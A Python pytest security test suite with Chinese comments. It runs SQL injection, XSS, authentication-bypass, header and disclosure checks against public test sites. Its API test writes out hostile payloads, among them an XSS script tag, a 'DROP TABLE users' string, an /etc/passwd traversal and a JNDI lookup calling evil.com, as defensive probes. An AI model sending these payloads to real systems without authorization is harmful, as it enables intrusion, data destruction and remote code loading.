"""
安全测试案例
展示安全测试功能：SQL注入、XSS、认证绕过、安全头检查等
使用WebGoat和其他安全测试目标
"""

import pytest
import allure
import requests
from typing import List, Dict

from utilities.security_tester import SecurityTester, SecurityFinding, VulnerabilityType
from utilities.api_client import APIClient
from utilities.logger import log


@allure.epic("安全测试")
@allure.feature("Web应用安全验证")
class TestSecurity:
    """安全测试类"""
    
    @pytest.fixture(autouse=True)
    def setup_security_test(self):
        """设置安全测试环境"""
        self.security_tester = SecurityTester()
        self.api_client = APIClient()
        
        # 测试目标URL
        self.test_targets = {
            "webgoat": "https://owasp.org/www-project-webgoat/",
            "httpbin": "https://httpbin.org",
            "demo_site": "https://demo.testfire.net"
        }
        
        log.info("安全测试环境初始化完成")
    
    @allure.story("SQL注入测试")
    @allure.severity(allure.severity_level.CRITICAL)
    @pytest.mark.security
    @pytest.mark.critical
    def test_sql_injection_detection(self):
        """测试SQL注入漏洞检测"""
        
        with allure.step("准备SQL注入测试"):
            # 使用httpbin作为测试目标（模拟参数传递）
            target_url = f"{self.test_targets['httpbin']}/get"
            test_parameters = {
                "id": "1",
                "search": "test",
                "category": "books"
            }
            
            log.info(f"开始SQL注入测试: {target_url}")
        
        with allure.step("执行SQL注入检测"):
            findings = self.security_tester.test_sql_injection(target_url, test_parameters)
            
            log.info(f"SQL注入测试完成，发现 {len(findings)} 个潜在问题")
        
        with allure.step("分析SQL注入测试结果"):
            sql_injection_report = "SQL注入测试报告:\n"
            sql_injection_report += f"测试URL: {target_url}\n"
            sql_injection_report += f"测试参数: {list(test_parameters.keys())}\n"
            sql_injection_report += f"发现问题数量: {len(findings)}\n\n"
            
            if findings:
                sql_injection_report += "发现的潜在SQL注入漏洞:\n"
                for i, finding in enumerate(findings, 1):
                    sql_injection_report += f"{i}. 参数: {finding.parameter}\n"
                    sql_injection_report += f"   载荷: {finding.payload}\n"
                    sql_injection_report += f"   严重程度: {finding.severity}\n"
                    sql_injection_report += f"   描述: {finding.description}\n\n"
                
                # 对于实际的安全测试，这里应该是断言失败
                # 但在演示环境中，我们只记录发现的问题
                log.warning(f"发现 {len(findings)} 个潜在SQL注入漏洞")
            else:
                sql_injection_report += "未发现SQL注入漏洞\n"
                log.info("SQL注入测试通过，未发现漏洞")
            
            allure.attach(
                sql_injection_report,
                name="SQL注入测试报告",
                attachment_type=allure.attachment_type.TEXT
            )
    
    @allure.story("XSS跨站脚本测试")
    @allure.severity(allure.severity_level.HIGH)
    @pytest.mark.security
    def test_xss_detection(self):
        """测试XSS跨站脚本漏洞检测"""
        
        with allure.step("准备XSS测试"):
            target_url = f"{self.test_targets['httpbin']}/get"
            test_parameters = {
                "message": "hello",
                "comment": "test comment",
                "search": "query"
            }
            
            log.info(f"开始XSS测试: {target_url}")
        
        with allure.step("执行XSS检测"):
            findings = self.security_tester.test_xss(target_url, test_parameters)
            
            log.info(f"XSS测试完成，发现 {len(findings)} 个潜在问题")
        
        with allure.step("分析XSS测试结果"):
            xss_report = "XSS跨站脚本测试报告:\n"
            xss_report += f"测试URL: {target_url}\n"
            xss_report += f"测试参数: {list(test_parameters.keys())}\n"
            xss_report += f"发现问题数量: {len(findings)}\n\n"
            
            if findings:
                xss_report += "发现的潜在XSS漏洞:\n"
                for i, finding in enumerate(findings, 1):
                    xss_report += f"{i}. 参数: {finding.parameter}\n"
                    xss_report += f"   载荷: {finding.payload}\n"
                    xss_report += f"   严重程度: {finding.severity}\n"
                    xss_report += f"   描述: {finding.description}\n\n"
                
                log.warning(f"发现 {len(findings)} 个潜在XSS漏洞")
            else:
                xss_report += "未发现XSS漏洞\n"
                log.info("XSS测试通过，未发现漏洞")
            
            allure.attach(
                xss_report,
                name="XSS测试报告",
                attachment_type=allure.attachment_type.TEXT
            )
    
    @allure.story("认证绕过测试")
    @allure.severity(allure.severity_level.CRITICAL)
    @pytest.mark.security
    def test_authentication_bypass(self):
        """测试认证绕过漏洞"""
        
        with allure.step("准备认证绕过测试"):
            # 使用httpbin的basic-auth端点进行测试
            login_url = f"{self.test_targets['httpbin']}/basic-auth/user/pass"
            
            log.info(f"开始认证绕过测试: {login_url}")
        
        with allure.step("执行认证绕过检测"):
            findings = self.security_tester.test_authentication_bypass(
                login_url=login_url,
                username_field="username",
                password_field="password"
            )
            
            log.info(f"认证绕过测试完成，发现 {len(findings)} 个潜在问题")
        
        with allure.step("分析认证绕过测试结果"):
            auth_report = "认证绕过测试报告:\n"
            auth_report += f"测试URL: {login_url}\n"
            auth_report += f"发现问题数量: {len(findings)}\n\n"
            
            if findings:
                auth_report += "发现的认证绕过漏洞:\n"
                for i, finding in enumerate(findings, 1):
                    auth_report += f"{i}. 载荷: {finding.payload}\n"
                    auth_report += f"   严重程度: {finding.severity}\n"
                    auth_report += f"   描述: {finding.description}\n"
                    auth_report += f"   建议: {finding.recommendation}\n\n"
                
                log.warning(f"发现 {len(findings)} 个认证绕过漏洞")
            else:
                auth_report += "未发现认证绕过漏洞\n"
                log.info("认证绕过测试通过，未发现漏洞")
            
            allure.attach(
                auth_report,
                name="认证绕过测试报告",
                attachment_type=allure.attachment_type.TEXT
            )
    
    @allure.story("安全头检查")
    @allure.severity(allure.severity_level.NORMAL)
    @pytest.mark.security
    def test_security_headers(self):
        """测试HTTP安全头配置"""
        
        test_urls = [
            self.test_targets["httpbin"],
            self.test_targets["webgoat"]
        ]
        
        all_findings = []
        
        for url in test_urls:
            with allure.step(f"检查安全头: {url}"):
                try:
                    findings = self.security_tester.test_security_headers(url)
                    all_findings.extend(findings)
                    
                    log.info(f"{url} 安全头检查完成，发现 {len(findings)} 个问题")
                except Exception as e:
                    log.warning(f"安全头检查失败 {url}: {e}")
        
        with allure.step("分析安全头检查结果"):
            headers_report = "HTTP安全头检查报告:\n"
            headers_report += f"检查的URL数量: {len(test_urls)}\n"
            headers_report += f"总发现问题数量: {len(all_findings)}\n\n"
            
            if all_findings:
                # 按URL分组显示结果
                findings_by_url = {}
                for finding in all_findings:
                    url = finding.url
                    if url not in findings_by_url:
                        findings_by_url[url] = []
                    findings_by_url[url].append(finding)
                
                for url, findings in findings_by_url.items():
                    headers_report += f"URL: {url}\n"
                    headers_report += f"发现问题: {len(findings)} 个\n"
                    
                    for i, finding in enumerate(findings, 1):
                        headers_report += f"  {i}. {finding.description}\n"
                        headers_report += f"     严重程度: {finding.severity}\n"
                        headers_report += f"     建议: {finding.recommendation}\n"
                    headers_report += "\n"
            else:
                headers_report += "所有检查的URL都配置了适当的安全头\n"
            
            allure.attach(
                headers_report,
                name="安全头检查报告",
                attachment_type=allure.attachment_type.TEXT
            )
            
            log.info(f"安全头检查完成，总共发现 {len(all_findings)} 个安全头配置问题")
    
    @allure.story("信息泄露检测")
    @allure.severity(allure.severity_level.NORMAL)
    @pytest.mark.security
    def test_information_disclosure(self):
        """测试信息泄露漏洞"""
        
        test_urls = [
            self.test_targets["httpbin"],
            self.test_targets["webgoat"]
        ]
        
        all_findings = []
        
        for url in test_urls:
            with allure.step(f"检查信息泄露: {url}"):
                try:
                    findings = self.security_tester.test_information_disclosure(url)
                    all_findings.extend(findings)
                    
                    log.info(f"{url} 信息泄露检查完成，发现 {len(findings)} 个问题")
                except Exception as e:
                    log.warning(f"信息泄露检查失败 {url}: {e}")
        
        with allure.step("分析信息泄露检查结果"):
            disclosure_report = "信息泄露检测报告:\n"
            disclosure_report += f"检查的URL数量: {len(test_urls)}\n"
            disclosure_report += f"总发现问题数量: {len(all_findings)}\n\n"
            
            if all_findings:
                for i, finding in enumerate(all_findings, 1):
                    disclosure_report += f"{i}. URL: {finding.url}\n"
                    disclosure_report += f"   类型: {finding.vulnerability_type.value}\n"
                    disclosure_report += f"   描述: {finding.description}\n"
                    disclosure_report += f"   证据: {finding.evidence}\n"
                    disclosure_report += f"   严重程度: {finding.severity}\n"
                    disclosure_report += f"   建议: {finding.recommendation}\n\n"
            else:
                disclosure_report += "未发现信息泄露问题\n"
            
            allure.attach(
                disclosure_report,
                name="信息泄露检测报告",
                attachment_type=allure.attachment_type.TEXT
            )
            
            log.info(f"信息泄露检测完成，总共发现 {len(all_findings)} 个问题")
    
    @allure.story("综合安全扫描")
    @allure.severity(allure.severity_level.CRITICAL)
    @pytest.mark.security
    @pytest.mark.comprehensive
    def test_comprehensive_security_scan(self):
        """执行综合安全扫描"""
        
        with allure.step("准备综合安全扫描"):
            target_url = self.test_targets["httpbin"]
            
            log.info(f"开始综合安全扫描: {target_url}")
        
        with allure.step("执行综合安全扫描"):
            all_findings = self.security_tester.comprehensive_security_scan(target_url)
            
            log.info(f"综合安全扫描完成，总共发现 {len(all_findings)} 个安全问题")
        
        with allure.step("分析综合扫描结果"):
            # 按漏洞类型分类
            findings_by_type = {}
            for finding in all_findings:
                vuln_type = finding.vulnerability_type.value
                if vuln_type not in findings_by_type:
                    findings_by_type[vuln_type] = []
                findings_by_type[vuln_type].append(finding)
            
            # 按严重程度分类
            findings_by_severity = {}
            for finding in all_findings:
                severity = finding.severity
                if severity not in findings_by_severity:
                    findings_by_severity[severity] = []
                findings_by_severity[severity].append(finding)
            
            # 生成综合报告
            comprehensive_report = f"综合安全扫描报告\n"
            comprehensive_report += f"{'='*50}\n"
            comprehensive_report += f"扫描目标: {target_url}\n"
            comprehensive_report += f"总发现问题: {len(all_findings)} 个\n\n"
            
            # 按严重程度统计
            comprehensive_report += "按严重程度统计:\n"
            for severity in ["Critical", "High", "Medium", "Low"]:
                count = len(findings_by_severity.get(severity, []))
                comprehensive_report += f"  {severity}: {count} 个\n"
            comprehensive_report += "\n"
            
            # 按漏洞类型统计
            comprehensive_report += "按漏洞类型统计:\n"
            for vuln_type, findings in findings_by_type.items():
                comprehensive_report += f"  {vuln_type}: {len(findings)} 个\n"
            comprehensive_report += "\n"
            
            # 详细问题列表
            if all_findings:
                comprehensive_report += "详细问题列表:\n"
                for i, finding in enumerate(all_findings, 1):
                    comprehensive_report += f"{i}. [{finding.severity}] {finding.vulnerability_type.value}\n"
                    comprehensive_report += f"   URL: {finding.url}\n"
                    comprehensive_report += f"   描述: {finding.description}\n"
                    if finding.parameter:
                        comprehensive_report += f"   参数: {finding.parameter}\n"
                    if finding.payload:
                        comprehensive_report += f"   载荷: {finding.payload}\n"
                    comprehensive_report += f"   建议: {finding.recommendation}\n\n"
            
            allure.attach(
                comprehensive_report,
                name="综合安全扫描报告",
                attachment_type=allure.attachment_type.TEXT
            )
            
            # 安全评分计算
            total_score = 100
            for finding in all_findings:
                if finding.severity == "Critical":
                    total_score -= 20
                elif finding.severity == "High":
                    total_score -= 10
                elif finding.severity == "Medium":
                    total_score -= 5
                elif finding.severity == "Low":
                    total_score -= 2
            
            total_score = max(0, total_score)  # 确保分数不为负
            
            log.info(f"安全评分: {total_score}/100")
            
            # 根据安全评分给出建议
            if total_score >= 90:
                security_level = "优秀"
            elif total_score >= 70:
                security_level = "良好"
            elif total_score >= 50:
                security_level = "一般"
            else:
                security_level = "需要改进"
            
            log.info(f"安全等级: {security_level}")
    
    @allure.story("API安全测试")
    @allure.severity(allure.severity_level.NORMAL)
    @pytest.mark.security
    @pytest.mark.api
    def test_api_security(self):
        """测试API安全性"""
        
        with allure.step("测试API认证安全"):
            # 测试无认证访问
            api_url = f"{self.test_targets['httpbin']}/bearer"
            
            response = self.api_client.get(api_url)
            
            # 检查是否正确拒绝无认证请求
            if response.status_code == 401:
                log.info("API正确拒绝了无认证请求")
            else:
                log.warning(f"API可能存在认证绕过问题，状态码: {response.status_code}")
        
        with allure.step("测试API输入验证"):
            # 测试恶意输入
            malicious_inputs = [
                {"test": "<script>alert('xss')</script>"},
                {"test": "'; DROP TABLE users; --"},
                {"test": "../../../etc/passwd"},
                {"test": "{{7*7}}"},  # 模板注入
                {"test": "${jndi:ldap://evil.com/a}"}  # JNDI注入
            ]
            
            api_url = f"{self.test_targets['httpbin']}/post"
            
            for i, malicious_input in enumerate(malicious_inputs):
                try:
                    response = self.api_client.post(api_url, json_data=malicious_input)
                    
                    if response.status_code == 200:
                        response_data = self.api_client.get_response_json(response)
                        
                        # 检查恶意输入是否被原样返回（可能存在安全问题）
                        if malicious_input["test"] in str(response_data):
                            log.warning(f"API可能存在输入验证问题，恶意输入被原样返回: {malicious_input['test']}")
                        else:
                            log.info(f"API正确处理了恶意输入 {i+1}")
                    
                except Exception as e:
                    log.debug(f"恶意输入测试异常: {e}")
        
        with allure.step("生成API安全测试报告"):
            api_security_report = """
API安全测试报告:
1. 认证测试: 检查API是否正确验证认证信息
2. 输入验证测试: 检查API是否正确处理恶意输入
3. 错误处理测试: 检查API是否泄露敏感信息

建议:
- 实施强认证机制
- 对所有输入进行严格验证和过滤
- 避免在错误消息中泄露敏感信息
- 使用HTTPS加密传输
- 实施速率限制防止暴力攻击
            """
            
            allure.attach(
                api_security_report,
                name="API安全测试报告",
                attachment_type=allure.attachment_type.TEXT
            )
